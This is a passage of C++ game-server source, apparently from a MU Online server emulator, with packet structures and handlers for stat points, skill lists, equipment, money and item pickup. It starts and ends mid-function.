	pMsg.MaxBP = gObj[aIndex].MaxBP + gObj[aIndex].AddBP;
	pMsg.wMaxShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
	pMsg.AddPoint = AddPoint;
	pMsg.MaxAddPoint = MaxAddPoint;
	pMsg.MinusPoint = MinusPoint;
	pMsg.MaxMinusPoint = MaxMinusPoint;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

	if ( iSendEffect == 1 )
		GCSendEffectInfo(aIndex, 0x10);
}



struct PMSG_LVPOINTADDRESULT
{
	PBMSG_HEAD h;	// C1:F3:06
	BYTE subcode;	// 3
	BYTE ResultType;	// 4
	WORD MaxLifeAndMana;	// 6
	WORD wMaxShield;	// 8
	WORD MaxBP;	// A
};


void CGLevelUpPointAdd(PMSG_LVPOINTADD * lpMsg, int aIndex)
{
	if ( !gObjIsConnected(aIndex))
	{
		LogAddC(2,"[CGLevelUpPointAdd] Index: %d",aIndex);
		CloseClient(aIndex);
		return;
	}

	PMSG_LVPOINTADDRESULT pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x06, sizeof(pMsg));
	pMsg.ResultType = 0;
	
	if (::gObjLevelUpPointAdd(lpMsg->Type, &gObj[aIndex]) == TRUE )
	{
		pMsg.ResultType = 0x10;
		pMsg.ResultType += lpMsg->Type;

		switch ( lpMsg->Type )
		{
			case 2:	// Vit
				pMsg.MaxLifeAndMana = gObj[aIndex].MaxLife + gObj[aIndex].AddLife;
				break;

			case 3:	// Energy
				pMsg.MaxLifeAndMana = gObj[aIndex].MaxMana + gObj[aIndex].AddMana;
				break;
		}
		pMsg.wMaxShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
		gObjSetBP(aIndex);
		pMsg.MaxBP = gObj[aIndex].MaxBP + gObj[aIndex].AddBP;
	}

	DataSend(aIndex, (UCHAR *)&pMsg, pMsg.h.size);
}



struct PMSG_INVENTORYITEMMODIFY
{
	PBMSG_HEAD h;	// C1:F3:14
	BYTE subcode;	// 3
	BYTE Pos;	// 4
	BYTE ItemInfo[MAX_ITEM_INFO];	// 5

};


void GCInventoryItemOneSend(int aIndex, int pos)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( !gObj[aIndex].pInventory[pos].IsItem())
		return;

	PMSG_INVENTORYITEMMODIFY pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x14, sizeof(pMsg));
	pMsg.Pos = pos;
	ItemByteConvert(pMsg.ItemInfo, gObj[aIndex].pInventory[pos]);

	DataSend(aIndex, (UCHAR *)&pMsg, pMsg.h.size);
}



struct PMSG_PKLEVEL
{
	PBMSG_HEAD h;	// C1:F3:08
	BYTE subcode;	// 3
	BYTE NumberH;	// 4
	BYTE NumberL;	// 5
	BYTE PkLevel;	// 6
};


void GCPkLevelSend(int aIndex, BYTE pklevel)
{
	PMSG_PKLEVEL pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x08, sizeof(pMsg));
	pMsg.NumberH = SET_NUMBERH(aIndex);
	pMsg.NumberL = SET_NUMBERL(aIndex);
	pMsg.PkLevel = pklevel;

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
	MsgSendV2(&gObj[aIndex], (UCHAR*)&pMsg, pMsg.h.size);
}



/*
// ORGINAL ONE
struct PMSG_MAGICLIST
{
	char Pos;	// 0
	BYTE MagicInfo[MAX_MAGIC_INFO];	// 1 /
};


struct PMSG_MAGICLISTCOUNT
{
	PBMSG_HEAD h;	// C1:F3:11
	BYTE subcode;	// 3
	BYTE Count;	// [0xFE:AddOne] [0xFF:DelOne] 4
	BYTE btListType;	// 5
};	BYTE SKILL[255];
*/


// I changed it coz of Season4 (leo123)
struct PMSG_MAGICLIST
{
	char Pos;	// 0
	BYTE MagicInfo[MAX_MAGIC_INFO];	// 1 // Leo123 : Was Byte CHANGED TO unsigend char (season4)
};


struct PMSG_MAGICLISTCOUNT
{
	PBMSG_HEAD h;	// C1:F3:11
	BYTE subcode;	// 3
	BYTE Count;	// [0xFE:AddOne] [0xFF:DelOne] 4
	BYTE btListType;	// 5
};	PMSG_MAGICLIST SKILL[255]; // CHANGED (SEASON4)



void GCMagicListOneSend(int aIndex, char Pos, WORD type, BYTE level, BYTE skill, BYTE btListType)
{
	PMSG_MAGICLISTCOUNT pCount;
	PMSG_MAGICLIST pList;
	BYTE sendbuf[1000];
	int lOfs = sizeof(pCount);

	PHeadSubSetB((LPBYTE)&pCount, 0xF3, 0x11, 0);
	pCount.Count = 0xFE;
	pCount.btListType = btListType;
	pList.Pos = Pos;
	pList.MagicInfo[DBM_TYPE] = LOBYTE(type);
	pList.MagicInfo[DBM_LEVEL] = HIBYTE(type);
	pList.MagicInfo[DMB_UNKOW] |= skill & 0x07;
	memcpy(&sendbuf[lOfs], &pList, sizeof(pList));
	lOfs+= sizeof(pList);
	pCount.h.size = lOfs;
	memcpy(sendbuf, &pCount, sizeof(pCount));
	DataSend(aIndex, sendbuf, lOfs);
}



void GCMagicListOneDelSend(int aIndex, char Pos, WORD type, BYTE level, BYTE skill, BYTE btListType)
{
	PMSG_MAGICLISTCOUNT pCount;
	PMSG_MAGICLIST pList;
	BYTE sendbuf[1000];
	int lOfs = sizeof(pCount);

	PHeadSubSetB((LPBYTE)&pCount, 0xF3, 0x11, 0);
	pCount.h.size = 0;
	pCount.Count = 0xFF;
	pCount.btListType = btListType;
	pList.Pos = Pos;
	pList.MagicInfo[DBM_TYPE] = LOBYTE(type);
	pList.MagicInfo[DBM_LEVEL] = HIBYTE(type);
	pList.MagicInfo[DMB_UNKOW] |= skill & 0x07;
	memcpy(&sendbuf[lOfs], &pList, sizeof(pList));
	lOfs+= sizeof(pList);
	pCount.h.size = lOfs;
	memcpy(sendbuf, &pCount, sizeof(pCount));

	DataSend(aIndex, sendbuf, lOfs);
}



void GCMagicListMultiSend(LPOBJ lpObj, BYTE btListType)
{
	int MaxBuf = MAX_MAGIC-4;
	int MaxOverFlow=0;
	btListType=0x0B;					//S4FIX
	PMSG_MAGICLISTCOUNT pCount;
	PMSG_MAGICLIST pList;
	BYTE sendbuf[1000] = {0};
	int lOfs = sizeof(pCount);
	int Count = 0;
	pCount.btListType = btListType;

	PHeadSubSetB((LPBYTE)&pCount, 0xF3, 0x11, 0);

	for ( int n=0;n<MAX_MAGIC;n++)
	{
		if ( lpObj->Magic[n].IsMagic() == TRUE )
		{
			if(n>=MaxBuf)
			{
				MaxOverFlow++;
				continue;
			}
			/*

			NOW S4:
						pNewProtocol[6+4*i] = pProtocol[6+3*i] ;
						pNewProtocol[7+4*i] = pProtocol[7+3*i] ;
						pNewProtocol[8+4*i] = 0 ;
						pNewProtocol[9+4*i] = pProtocol[8+3*i] ;
			*/
			pList.Pos = n;
			WORD SkillAdd = lpObj->Magic[n].m_Skill;
			Mastering2.GCMagicListMultiSendChanges(lpObj->m_Index,n,SkillAdd);
			pList.MagicInfo[0] = LOBYTE(SkillAdd); 
			pList.MagicInfo[1] = HIBYTE(SkillAdd);//0;//lpObj->Magic[n].m_Level<<3;
			pList.MagicInfo[2] = SkillAdd & 0x07;
			//pList.MagicInfo[1] = 0;
			//pList.MagicInfo[4] = 0;
			memcpy(&sendbuf[lOfs], &pList, sizeof(pList));
			lOfs+= sizeof(pList);
			Count++;

			/*
			EP 2:
						pNewProtocol[6+6*i] =  pProtocol[6+3*i] ;//
						pNewProtocol[7+6*i] =  0 ;
						pNewProtocol[8+6*i] =  pProtocol[7+3*i] ;  //
						pNewProtocol[9+6*i] =  0 ;
						pNewProtocol[10+6*i] =  pProtocol[8+3*i] ;  //
						pNewProtocol[11+6*i] =  0 ;
			*/
			//pList.Pos = n;
			//pList.MagicInfo[0] = 0;//lpObj->Magic[n].m_Skill;
			//pList.MagicInfo[1] = lpObj->Magic[n].m_Skill;//lpObj->Magic[n].m_Level<<3;
			//pList.MagicInfo[2] = 0;//lpObj->Magic[n].m_Skill & 0x07;
			//pList.MagicInfo[3] = lpObj->Magic[n].m_Skill & 0x07;
			//pList.MagicInfo[4] = 0;
			//memcpy(&sendbuf[lOfs], &pList, sizeof(pList));
			//lOfs+= sizeof(pList);
			//Count++;
			
			//pList.Pos = n;
			//pList.MagicInfo[DBM_TYPE] = lpObj->Magic[n].m_Skill;
			//pList.MagicInfo[DBM_LEVEL] = lpObj->Magic[n].m_Level<<3;
			//pList.MagicInfo[DMB_UNKOW] |= lpObj->Magic[n].m_Skill & 0x07;
			//memcpy(&sendbuf[lOfs], &pList, sizeof(pList));
			//lOfs+= sizeof(pList);
			//Count++;
		}
	}

	pCount.Count = Count;
	pCount.h.size = 6+Count*6;//lOfs;
	memcpy(sendbuf, &pCount, sizeof(pCount));

	DataSend(lpObj->m_Index, sendbuf, pCount.h.size);// sendbuf[1]);

	if(MaxOverFlow > 0)
	{
		for(int i=MaxBuf;i<MaxBuf+MaxOverFlow;i++)
		{
			if ( lpObj->Magic[i].IsMagic() == TRUE )
			{
				WORD SkillAdd = lpObj->Magic[i].m_Skill;
				Mastering2.GCMagicListMultiSendChanges(lpObj->m_Index,i,SkillAdd);
				GCMagicListOneSend(lpObj->m_Index,i,SkillAdd,0xDC,SkillAdd,0);
			}
		}
	}

}

struct PMSG_EQUIPMENTLIST
{
	PBMSG_HEAD h;	// C1:F3:13
	BYTE subcode;	// 3
	BYTE NumberH;	// 4
	BYTE NumberL;	// 5
	BYTE Equipment[CHAR_SET_SIZE];	// 6
};


void GCEquipmentSend(int aIndex)
{
	PMSG_EQUIPMENTLIST pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x13, sizeof(pMsg));
	pMsg.NumberH = SET_NUMBERH(aIndex);
	pMsg.NumberL = SET_NUMBERL(aIndex);
	gObjMakePreviewCharSet(aIndex);
	LPOBJ lpObj = &gObj[aIndex];
	memcpy(pMsg.Equipment, lpObj->CharSet, sizeof(lpObj->CharSet));

	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);
}



struct PMSG_RECALLMONLIFE
{
	PBMSG_HEAD h;	// C1:F3:20
	BYTE subcode;	// 3
	BYTE Life;	// 4
};


void GCRecallMonLife(int aIndex, int maxlife, int life)
{
	if ( maxlife <= 0 )
		return;
	
	PMSG_RECALLMONLIFE pMsg;
	BYTE per = life * 100 / maxlife;
	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x20, sizeof(pMsg));
	pMsg.Life = per;

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}





struct PMSG_TIMEVIEW
{
	PBMSG_HEAD h;	// C1:F3:22
	BYTE subcode;	// 3
	WORD Second;	// 4
};


void GCTimeViewSend(int aIndex, int second)
{
	PMSG_TIMEVIEW pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x22, sizeof(pMsg));
	pMsg.Second = second;

	DataSend(aIndex, (UCHAR *)&pMsg, pMsg.h.size);
}




struct PMSG_GOALSEND
{
	PBMSG_HEAD h;	// C1:F3:23
	BYTE subcode;	// 3
	char RedTeamName[8];	// 4
	BYTE RedTeamScore;	// C
	char BlueTeamName[8];	// D
	BYTE BlueTeamScore;	// 15
};


void GCGoalSend(int aIndex, char* Name1, BYTE score1, char* Name2, BYTE score2)
{
	PMSG_GOALSEND pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x23, sizeof(pMsg));
	memcpy(pMsg.RedTeamName, Name1, sizeof(pMsg.RedTeamName));
	pMsg.RedTeamScore = score1;
	memcpy(pMsg.BlueTeamName, Name2, sizeof(pMsg.BlueTeamName));
	pMsg.BlueTeamScore = score2;

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}




void GCSkillKeyRecv(PMSG_SKILLKEY * lpMsg, int aIndex)
{
	if ( !gObjIsGamePlaing(&gObj[aIndex]))
		return;

#if (BORDS == 0)
	DGOptionDataSend(aIndex, gObj[aIndex].Name,
		lpMsg->SKillKey, lpMsg->GameOption,
		lpMsg->QkeyDefine,  lpMsg->WkeyDefine, lpMsg->EkeyDefine, lpMsg->ChatWindow);
	LogAddL("Option Recv %d %d %d %d", lpMsg->GameOption,
		lpMsg->QkeyDefine,  lpMsg->WkeyDefine, lpMsg->EkeyDefine);
#else
	DGOptionDataSend(aIndex, gObj[aIndex].Name,
		lpMsg->SKillKey, lpMsg->GameOption,
		lpMsg->QkeyDefine,  lpMsg->WkeyDefine, lpMsg->EkeyDefine, lpMsg->ChatWindow, lpMsg->RkeyDefine);
	LogAddL("Option Recv %d %d %d %d %d", lpMsg->GameOption,
		lpMsg->QkeyDefine,  lpMsg->WkeyDefine, lpMsg->EkeyDefine, lpMsg->RkeyDefine);
#endif

}







#if (BORDS == 0)
	void GCSkillKeySend(int aIndex, LPBYTE keybuffer, BYTE GO, BYTE Qk, BYTE Wk, BYTE Ek, BYTE ChatWnd)
#else
	void GCSkillKeySend(int aIndex, LPBYTE keybuffer, BYTE GO, BYTE Qk, BYTE Wk, BYTE Ek, BYTE ChatWnd, BYTE Rk)
#endif
{
	PMSG_SKILLKEY pMsg = {0};

	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x30, sizeof(pMsg));
	memcpy(pMsg.SKillKey, keybuffer, sizeof(pMsg.SKillKey));
	pMsg.GameOption = GO;
	pMsg.QkeyDefine = Qk;
	pMsg.WkeyDefine = Wk;
	pMsg.EkeyDefine = Ek;
	pMsg.ChatWindow = ChatWnd;
#if (BORDS == 1)
	pMsg.RkeyDefine = Rk;
#endif
	if(ReadConfig.S6E2 == 1)
		memcpy(&gObj[aIndex].sSkillKey,&pMsg.SKillKey[0],sizeof(gObj[aIndex].sSkillKey));

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
#if (BORDS == 0)
	LogAddL("Option Send %d %d %d %d", GO, Qk, Wk, Ek);
#else
	LogAddL("Option Send %d %d %d %d %d", GO, Qk, Wk, Ek, Rk);
#endif
	
}



struct PMSG_ITEMGETRESULT
{
	PBMSG_HEAD h;	// C1:22
	BYTE result;	// [0xFE:Money] 3
	BYTE Data[MAX_ITEM_INFO];	// 4
};


void GCMoneySend(int aIndex, DWORD money)
{
	PMSG_ITEMGETRESULT pMsg;

	pMsg.h.c = 0xC3;
	pMsg.h.headcode = 0x22;
	pMsg.h.size = sizeof(pMsg);
	pMsg.result = 0xFE;

	WORD hiWord = SET_NUMBERHW(money);
	WORD loWord = SET_NUMBERLW(money);
	pMsg.Data[0] = SET_NUMBERH(hiWord);
	pMsg.Data[1] = SET_NUMBERL(hiWord);
	pMsg.Data[2] = SET_NUMBERH(loWord);
	pMsg.Data[3] = SET_NUMBERL(loWord);

	pMsg.Data[4] = 0;
	pMsg.Data[5] = 0;
	pMsg.Data[6] = 0;
	pMsg.Data[7] = 0;
	pMsg.Data[8] = 0;
	pMsg.Data[9] = 0;
	pMsg.Data[10] = 0;
	pMsg.Data[11] = 0;

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}



void GCItemInventoryPutSend(int aIndex,BYTE result, BYTE iteminfo1, BYTE iteminfo2)
{
	PMSG_ITEMGETRESULT pResult;

	pResult.h.c = 0xC3;
	pResult.h.headcode = 0x22;
	pResult.h.size = sizeof(pResult);
	pResult.result = result;
	pResult.Data[0] = iteminfo1;
	pResult.Data[1] = iteminfo2;
	pResult.h.size -= 2;

	DataSend(aIndex, (UCHAR*)&pResult, pResult.h.size);
}





void CGItemGetRequest(PMSG_ITEMGETREQUEST * lpMsg, int aIndex)
{
	int item_num, map_num;
	PMSG_ITEMGETRESULT pResult;
	int type;
	int level;
	int special;
	int NOption;
	char szItemName[50];
	CMapItem * lpItem;

	pResult.h.c = 0xC3;
	pResult.h.headcode = 0x22;
	pResult.h.size = sizeof(pResult);
	pResult.result = -1;

	if ( !gObjIsConnected(aIndex))
	{
		LogAddC(2,"[CGItemGetRequest] Index: %d",aIndex);
		CloseClient(aIndex);
		return;
	}

	if ( gObj[aIndex].CloseType != -1 )
		return;

	if ( gObj[aIndex].m_bMapSvrMoveQuit == true || gObj[aIndex].m_bMapAntiHackMove == true )
		return;

	if ( gObj[aIndex].DieRegen != 0 )
	{
		pResult.result = -1;
		pResult.h.size -= sizeof(pResult.Data);
		DataSend(aIndex, (UCHAR*)&pResult, pResult.h.size);

		return;
	}

	if ( gObj[aIndex].m_IfState.use != 0 )
	{
		if ( gObj[aIndex].m_IfState.type != 3 )
		{
			::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 94)), aIndex, 1);
			pResult.result = -1;
			pResult.h.size -= sizeof(pResult.Data);
			DataSend(aIndex, (UCHAR*)&pResult, pResult.h.size);

			return;
		}
	}

	if ( !::gObjFixInventoryPointer(aIndex))
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);

	if ( gObj[aIndex].pTransaction == TRUE )
	{
		LogAddTD("[%s][%s] CGItemGetRequest() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_IfState.type);
		return;

	}

	item_num = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);

	if ( MAX_ITEM_TYPE_RANGE(item_num) == FALSE )
	{
		LogAdd("error-L3 : %s %d", __FILE__, __LINE__);
		pResult.result = -1;
		pResult.h.size -= sizeof(pResult.Data);
		DataSend(aIndex, (UCHAR*)&pResult, pResult.h.size);

		return;
	}

	map_num = gObj[aIndex].MapNumber;

	if ( MAX_MAP_RANGE(map_num) == FALSE )
	{
		LogAdd("error-L3 : %s %d", __FILE__, __LINE__);
		pResult.result = -1;
		pResult.h.size -= sizeof(pResult.Data);
		DataSend(aIndex, (UCHAR*)&pResult, pResult.h.size);

		return;
	}

	lpItem = &MapC[map_num].m_cItem[item_num];

	if ( lpItem->IsItem() == TRUE && lpItem->Give == false && lpItem->live == true)
	{
		if ( lpItem->m_QuestItem != false )
		{
			int ItemCount = gObjGetItemCountInIventory(aIndex, lpItem->m_Type);

			if ( (lpItem->m_Type == ITEMGET(14,65)) || (lpItem->m_Type == ITEMGET(14,66)) || (lpItem->m_Type == ITEMGET(14,67)) )
			{
				if ( ItemCount > 2 )
				{
					LogAdd("[Quest][Season 3] Too many have quest item [%s][%s] (%s) %d",
						gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->GetName(), ItemCount);
					pResult.result = -1;
					pResult.h.size -= sizeof(pResult.Data);

					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

					return;
				}
			}
			else if ( ItemCount > 0 )
			{
				LogAdd("[Quest] Too many have quest item [%s][%s] (%s) %d",
					gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->GetName(), ItemCount);
				pResult.result = -1;
				pResult.h.size -= sizeof(pResult.Data);

				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

				return;
			}
		}

		if ( lpItem->m_Type == ITEMGET(14,64) )	// FireBall Illusion Temple
		{
			if (IT_MAP_RANGE(gObj[aIndex].MapNumber))
			{
				BYTE IT_LEVEL = gObj[aIndex].MapNumber - 45;
				
				IllusionTemple.Room[IT_LEVEL].Hero=aIndex;
				IllusionTemple.Room[IT_LEVEL].Hero_X = gObj[aIndex].X;
				IllusionTemple.Room[IT_LEVEL].Hero_Y = gObj[aIndex].Y;

				char sBuf[255]={0};
				wsprintf(sBuf,"%s picked up fire spark!",gObj[aIndex].Name);
				IllusionTemple.GCServerMsgStringSendToRoom(IT_LEVEL,sBuf,0);

				int pIndex = IllusionTemple.Player_GetIndex(IT_LEVEL,aIndex);
				if (pIndex != -1)
				{
					IllusionTemple.Room[IT_LEVEL].Player[pIndex].total_score += IllusionTemple.PickUpBallRankExp;
				}
			}
		}

		if ( lpItem->m_Type == ITEMGET(13,20) )	// Wizard Ring
		{
			switch ( lpItem->m_Level )
			{
				case 0:
				{
					int iWRCount = gObjGetItemCountInIventory(aIndex, lpItem->m_Type/MAX_SUBTYPE_ITEMS, lpItem->m_Type%MAX_SUBTYPE_ITEMS, lpItem->m_Level);

					if ( iWRCount > 0 )
					{
						LogAdd("[Ring Event] Too many have Magician's Ring [%s][%s] (Name:%s, Count:%d)",
							gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->GetName(), iWRCount);

						pResult.result = -1;
						pResult.h.size -= sizeof(pResult.Data);

						DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
						::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 186)), aIndex, 1);

						return;
					}
					break;
				}
				case 1:

					pResult.result = -1;
					pResult.h.size -= sizeof(pResult.Data);

					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					return;
					break;
				
			}
		}

		if ( lpItem->m_Type == ITEMGET(13,107) )
		{
			int iWRCount = gObjGetItemCountInIventory(aIndex, lpItem->m_Type/MAX_SUBTYPE_ITEMS, lpItem->m_Type%MAX_SUBTYPE_ITEMS, lpItem->m_Level);

			if ( iWRCount > 0 )
			{
				LogAdd("[Ring Event] Too many have Lethal Magician's Ring [%s][%s] (Name:%s, Count:%d)",
					gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->GetName(), iWRCount);

				pResult.result = -1;
				pResult.h.size -= sizeof(pResult.Data);

				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
				::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 186)), aIndex, 1);

				return;
			}
		}

		if ( lpItem->m_Type == ITEMGET(13,20) && lpItem->m_Level == 2 )	// Wizard Ring
		{
			pResult.result = -1;
			pResult.h.size -= sizeof(pResult.Data);

			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);			

			return;
		}

		if ( lpItem->m_Type == ITEMGET(13,38) )	// MoonStonePendant
		{
			int count = gObjGetItemCountInIventory(aIndex, lpItem->m_Type/MAX_SUBTYPE_ITEMS,
				lpItem->m_Type % MAX_SUBTYPE_ITEMS, lpItem->m_Level);

			if ( count > 0 )
			{
				LogAdd("[MoonStonePendant] Too many have MoonStonePendant [%s][%s] ( Name:%s, Count:%d )",
					gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->GetName(), count);

				pResult.result = -1;
				pResult.h.size -= sizeof(pResult.Data);

				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);	
				GCServerMsgStringSend(lMsg.Get(MSGGET(13, 56)), aIndex, 1);

				return;
			}
		}

		if ( lpItem->m_Type == ITEMGET(13,39) )	// ChangeRing
		{
			int count = gObjGetItemCountInIventory(aIndex, lpItem->m_Type/MAX_SUBTYPE_ITEMS,
				lpItem->m_Type % MAX_SUBTYPE_ITEMS, lpItem->m_Level);

			if ( count > 0 )
			{
				LogAdd("[ChangeRing] Too many have ChangeRing [%s][%s] ( Name:%s, Count:%d )",
					gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->GetName(), count);

				pResult.result = -1;
				pResult.h.size -= sizeof(pResult.Data);

				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);	
				GCServerMsgStringSend(lMsg.Get(MSGGET(13, 63)), aIndex, 1);

				return;
			}
		}

		type = lpItem->m_Type;
		level = lpItem->m_Level;
		special = lpItem->m_Special[0];
		NOption = lpItem->m_NewOption;
		strcpy(szItemName, lpItem->GetName());

		if ( lpItem->m_Type == ITEMGET(14,15) ) // Zen
		{
			if ( MapC[map_num].ItemGive(aIndex, item_num, false) == TRUE )
			{
				/*if ( !gObjCheckMaxZen(aIndex, lpItem->m_BuyMoney))
				{
					if ( gObj[aIndex].Money < MAX_ZEN )
					{
						gObj[aIndex].Money = MAX_ZEN;
						pResult.result = -2;
						WORD hiWord = SET_NUMBERHW(gObj[aIndex].Money);
						WORD loWord = SET_NUMBERLW(gObj[aIndex].Money);
						pResult.Data[0] = SET_NUMBERH(hiWord);
						pResult.Data[1] = SET_NUMBERL(hiWord);
						pResult.Data[2] = SET_NUMBERH(loWord);
						pResult.Data[3] = SET_NUMBERL(loWord);

						DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

						return;
					}

					pResult.result = -1;
					pResult.h.size -= sizeof(pResult.Data);

					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);			

					return;
				}*/

				__int64 tmpZen = (__int64)gObj[aIndex].Money + (__int64)lpItem->m_BuyMoney;
				if ( tmpZen > (__int64)MAX_ZEN )
				{
					gObj[aIndex].Money = MAX_ZEN;
				} else {
					gObj[aIndex].Money += lpItem->m_BuyMoney;
				}

				pResult.result = -2;

				WORD hiWord = SET_NUMBERHW(gObj[aIndex].Money);
				WORD loWord = SET_NUMBERLW(gObj[aIndex].Money);
				pResult.Data[0] = SET_NUMBERH(hiWord);
				pResult.Data[1] = SET_NUMBERL(hiWord);
				pResult.Data[2] = SET_NUMBERH(loWord);
				pResult.Data[3] = SET_NUMBERL(loWord);
				pResult.h.size -= 3;
			}

			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		}
		else
		{
			if ( lpItem->m_Type == ITEMGET(13,32) )
			{

				int pos = gObjOverlapItemUsingDur((lpItem)?((CItem *)&lpItem->m_Number):NULL, map_num, item_num, aIndex, 20, ITEMGET(13,32), 0);

				if ( ReadConfig.MAIN_INVENTORY_RANGE(aIndex,pos,false) != FALSE )
				{
					pResult.result = -3;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					gObj[aIndex].pInventory[pos].m_Durability += lpItem->m_Durability;
					GCItemDurSend(aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability, 0);

					return;
				}
			}

			if ( lpItem->m_Type >= ITEMGET(14,88) && lpItem->m_Type <= ITEMGET(14,90) ) //Blossom
			{
				int pos = gObjOverlapItemUsingDur((lpItem)?((CItem *)&lpItem->m_Number):NULL, map_num, item_num, aIndex, 255, lpItem->m_Type, 0);

				if ( ReadConfig.MAIN_INVENTORY_RANGE(aIndex,pos,false) != FALSE )
				{
					pResult.result = -3;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					gObj[aIndex].pInventory[pos].m_Durability += lpItem->m_Durability;
					GCItemDurSend(aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability, 0);

					return;
				}
			}

			if ( lpItem->m_Type == ITEMGET(14,100))//Lucky Coins
			{
				int pos = gObjOverlapItemUsingDur((lpItem)?((CItem *)&lpItem->m_Number):NULL, map_num, item_num, aIndex, 255, lpItem->m_Type, 0);

				if ( ReadConfig.MAIN_INVENTORY_RANGE(aIndex,pos,false) != FALSE )
				{
					pResult.result = -3;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					gObj[aIndex].pInventory[pos].m_Durability += lpItem->m_Durability;
					GCItemDurSend(aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability, 0);

					return;
				}
			}

			

			if ( lpItem->m_Type >= ITEMGET(14,153) && lpItem->m_Type <= ITEMGET(14,156))//NEW QUEST ITEMS
			{
				int pos = gObjOverlapItemUsingDur((lpItem)?((CItem *)&lpItem->m_Number):NULL, map_num, item_num, aIndex, 255, lpItem->m_Type, 0);

				if ( ReadConfig.MAIN_INVENTORY_RANGE(aIndex,pos,false) != FALSE )
				{
					pResult.result = -3;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					gObj[aIndex].pInventory[pos].m_Durability += lpItem->m_Durability;
					GCItemDurSend(aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability, 0);

					return;
				}
			}

			if ( lpItem->m_Type == ITEMGET(13,33) )
			{
				int pos = gObjOverlapItemUsingDur((lpItem)?((CItem *)&lpItem->m_Number):NULL, map_num, item_num, aIndex, 20, ITEMGET(13,33), 0);

				if ( ReadConfig.MAIN_INVENTORY_RANGE(aIndex,pos,false) != FALSE )
				{
					pResult.result = -3;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					gObj[aIndex].pInventory[pos].m_Durability += lpItem->m_Durability;
					GCItemDurSend(aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability, 0);

					return;
				}
			}

			if ( lpItem->m_Type == ITEMGET(13,34) )
			{
				int pos = gObjOverlapItemUsingDur((lpItem)?((CItem *)&lpItem->m_Number):NULL, map_num, item_num, aIndex, 10, ITEMGET(13,34), 0);

				if ( ReadConfig.MAIN_INVENTORY_RANGE(aIndex,pos,false) != FALSE )
				{
					pResult.result = -3;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					gObj[aIndex].pInventory[pos].m_Durability += lpItem->m_Durability;
					GCItemDurSend(aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability, 0);

					return;
				}
			}

			if ( lpItem->m_Type == ITEMGET(14,110) ) // Blue Ball Piece = Double Goer ticket
			{
				for ( int n=0;n<ReadConfig.MAIN_INVENTORY_SIZE(aIndex,false);n++)
				{
					int pos = g_DoppelGanger.CheckOverlapGoerMark(aIndex);

					if ( ReadConfig.MAIN_INVENTORY_RANGE(aIndex,pos,false) )
					{
						if ( MapC[map_num].ItemGive(aIndex, item_num, true) == TRUE )
						{
							BYTE NewOption[MAX_EXOPTION_SIZE];

							::ItemIsBufExOption(NewOption, (lpItem != NULL)?(CItem*)&lpItem->m_Number:NULL);

							PLAYER_ITEMS_LOG.Output(lMsg.Get(MSGGET(1, 221)), gObj[aIndex].AccountID, gObj[aIndex].Name, map_num,
								gObj[aIndex].X, gObj[aIndex].Y, lpItem->m_Number, szItemName, type,
								level, lpItem->m_SkillOption, lpItem->m_LuckOption, lpItem->m_Z28Option, (int)lpItem->m_Durability,
								NewOption[0], NewOption[1], NewOption[2], NewOption[3], NewOption[4], NewOption[5],
								NewOption[6], lpItem->m_SetOption, lpItem->m_ItemOptionEx>>7,
